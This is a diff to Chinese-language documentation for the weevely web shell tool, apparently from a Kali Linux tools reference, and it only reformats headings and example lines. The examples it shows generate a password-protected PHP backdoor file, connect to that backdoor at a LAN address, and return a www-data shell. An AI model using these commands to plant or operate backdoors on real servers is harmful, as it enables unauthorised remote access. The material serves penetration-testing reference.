@@ -54,16 +54,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### `weevely`
 
-官方给出的调用示例：`weevely generate s3cr3t`
+> 官方示例调用：`weevely generate s3cr3t`
 
 ```text
 root@kali:~# weevely generate s3cr3t
 [generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'
 ```
 
-### `weevely（示例）`
+### `weevely http://192.168.1.202/weevely.php s3cr3t`
 
-官方给出的调用示例：`weevely http://192.168.1.202/weevely.php s3cr3t`
+> 官方示例调用：`weevely http://192.168.1.202/weevely.php s3cr3t`
 
 ```text
 root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
@@ -81,9 +81,9 @@ www-data@kali:/var/www $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-### `weevely（示例）`
+### `weevely -h`
 
-官方给出的调用示例：`weevely -h`
+> 官方示例调用：`weevely -h`
 
 ```text
 root@kali:~# weevely -h
